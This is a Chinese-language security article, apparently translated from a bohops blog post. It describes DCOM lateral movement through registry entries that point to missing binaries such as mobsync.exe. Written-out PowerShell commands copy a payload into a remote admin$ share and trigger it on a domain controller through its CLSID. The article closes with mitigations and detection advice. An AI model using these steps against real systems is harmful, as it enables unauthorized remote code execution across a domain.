![1.png](https://image.3001.net/images/20180625/15299372196062.png!small)

## 长话短说

这篇文章主要讨论的是DCOM横向渗透以及Payload执行方法，当目标系统的\\\target\admin$\system32\中不包含mobsync.exe时，本文所介绍的方法才可行。如果你能获取到目标系统的管理员权限（通过PowerShell），你将能做到如下所示的东西：

    
    
    - dir\\target\system32\mobsync.exe   //shouldnot exist
    -copy evil.exe \\target\admin$\system32\mobsync.exe
    -[activator]::CreateInstance([type]::GetTypeFromCLSID("C947D50F-378E-4FF6-8835-FCB50305244D","target"))  
    

### 介绍

在这篇文章中，我们将介绍如何利用DCOM（分布式构件对象模型）来实现横向渗透并远程执行Payload。本文主要讨论的内容如下：

1\. 引言；

2\. 研究动机；

3\. 简单的DCOM横向渗透方法论；

4\. 缓解方案；

## 引言

在此之前，关于DCOM横向渗透技术的内容讨论了已经有一年半载了，Matt Nelson
([enigma0x3](https://twitter.com/enigma0x3))此前也介绍过多种利用D/COM对象（例如MMC20、ShellWindows,ShellBrowserWindow、Excel和Outlook）实现的横向渗透技术。相应的，Philip
Tsukerman
([@PhilipTsukerman](https://twitter.com/PhilipTsukerman))也发现过一种有趣的WMI横向渗透技术，他的【
[这篇文章](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)】可以帮助大家更好地了解DCOM功能、横向渗透技术以及相应的缓解方案。在继续阅读本文之前，我强烈建议大家阅读一下这些资料。

## 研究动机

几周之前，我打算对我的笔记本系统进行虚拟化分析，虽然转换过程非常痛苦，但最终还是在相关工具的帮助下成功了。但是考虑到安全问题，我需要确定原本的物理设备中是否还存有遗留数据，我手上没有什么标准可以遵循，而且我对数字取证方面有额不感兴趣。所以我打算研究一下注册表，然后我很快就找到了一个有趣的CLSID注册表路径，它引用了一份二进制文件，而这个文件很可能是笔记本上为某个程序提供实用功能或者诊断功能的一个程序：

![2.png](https://image.3001.net/images/20180625/15299372546143.png!small)

通过DIR命令查询后，我们发现磁盘中并没有C:\WINDOWS\system32\IntelCpHDCPSvc.exe：

![3.png](https://image.3001.net/images/20180625/15299372609044.png!small)

我的脑海里瞬间出现了下面三个想法：

1\. IntelCpHDCPSvc.exe是什么鬼？

2\. 软件卸载工具并没有完全删除旧软件遗留在注册表里的东西。

3\. 这似乎是一个DCOM应用（使用Get-CimInstanceWin32_DCOMApplication查询语句进行验证）。

![4.png](https://image.3001.net/images/20180625/15299372679624.png!small)

通过搜索引擎得知，IntelCpHDCPSvc.exe跟英特尔的内容保护HDCP服务有关，但是最有意思的是，LocalServer32和InProcServer32这两个注册表键值指向的是本应该存在的二进制文件路径，而这些不存在的文件很可能会带来严重的安全风险。由于在真实的攻击中我们很少能够看到IntelCpHDCPSvc的身影，因此我想看看能否可以利用DCOM来做些什么。

## DCOM横向渗透方法论

### 定位二进制文件

首先，我们需要在DCOM应用中定位相应的二进制文件路径。这里我们可以利用下面的命令从Windows
2012中导出LocalServer32可执行程序和InProcServer32 DLL：

    
    
      
    

gwmiWin32_COMSetting -computername 127.0.0.1 | ft LocalServer32 -autosize
|Out-String -width 4096 | out-file dcom_exes.txt

gwmiWin32_COMSetting -computername 127.0.0.1 | ft InProcServer32 -autosize
|Out-String -width 4096 | out-file dcom_dlls.txt

我们得到了下列信息：

![5.png](https://image.3001.net/images/20180625/15299373055928.png!small)

对数据进行拼接和过滤之后，我们可以使用下列命令查询这些文件：

    
    
      
    

$file= gc C:\Users\test\desktop\dcom_things.txt

foreach($binpath in $file) {

$binpath

cmd.exe /c dir $binpath > $null

}

查询结果如下：

    
    
      
    

%SystemRoot%\system32\mobsync.exe

FileNot Found

如下图所示，文件确实不存在：

![6.png](https://image.3001.net/images/20180625/15299373424176.png!small)

实际上，mobsync是Microsoft同步中心和脱机文件功能中的一个进程，因此mobsync.exe又开始变得更加有趣了。

### 验证AppID和CLSID

之前我在枚举AppID和CLSID方面没有做得很好，所以我重新查看了注册表并查找这些信息：

![7.png](https://image.3001.net/images/20180625/15299373819305.png!small)

具体说来，在下个阶段中我们需要利用[C947D50F-378E-4FF6-8835-FCB50305244D]这个CLSID来创建DCOM对象实例。

### 远程Payload执行和横向渗透

首先我们需要满足以下条件：

1\. 在远程实例化DCOM对象之前，我们需要拿到管理员权限。

2\. 为了发挥Payload的作用，我们将尝试渗透目标主机所在域环境。假设已经拿到了管理员账号凭证，我们将以Windows
10作为攻击端，然后在Windows 2012域控制器（DC）上尝试实现远程命令执行。

首先是Payload，并确保目标系统中不包含mobsync.exe：

    
    
    dir C:\evil.exe
    dir \\acmedc\admin$\system32\mobsync.exe  
    

![8.png](https://image.3001.net/images/20180625/15299374262931.png!small)

非常好！由于mobsync.exe不存在，所以我们的Payload（evil.exe）就能够绕过主机保护机制了，然后将其拷贝到DC上：

    
    
    copy C:\evil.exe \\acmedc\admin$\system32\mobsync.exe
    dir \\acmedc\admin$\system32\mobsync.exe  
    

![9.png](https://image.3001.net/images/20180625/15299374522944.png!small)

由于我们的二进制文件无法识别DCOM，因此实例化操作将无法成功，但Payload还是可以成功触发的：

    
    
    [activator]::CreateInstance([type]::GetTypeFromCLSID("C947D50F-378E-4FF6-8835-FCB50305244D","target"))

Windows10域成员：

![10.png](https://image.3001.net/images/20180625/15299374792413.png!small)

Windows2012域控制器：

![11.png](https://image.3001.net/images/20180625/15299374886325.png!small)

非常好，我们的“mobsync.exe”生成了恶意的“notepad.exe” Payload。

## 缓解方案

厂商：

1\. 当软件工具被卸载之后，确保没有DCOM注册表项遗留。

2\. 不要在注册表中创建指向并不存在的二进制文件的DCOM程序路径。

网络防御端：

1\. 认真阅读enigma0x3以及@PhilipTsukerman在各自文章中给出的建议，有针对性地收集相关IoC。

2\. 避免重复使用主机账号凭证。

3\. 部署深度防御策略以及安全监控产品。

4\. 监控文件系统及注册表。

5\. 监控网络环境中的异常PowerShell操作，尽量强制启用PowerShell的受限语言模式（CLM）。

6\. 当DCOM调用失败时，主机的系统日志中会生成ID为10010的错误事件信息，其中将包含CLSID信息。

![12.png](https://image.3001.net/images/20180625/15299375044412.png!small)

 *** 参考来源：[bohops](https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

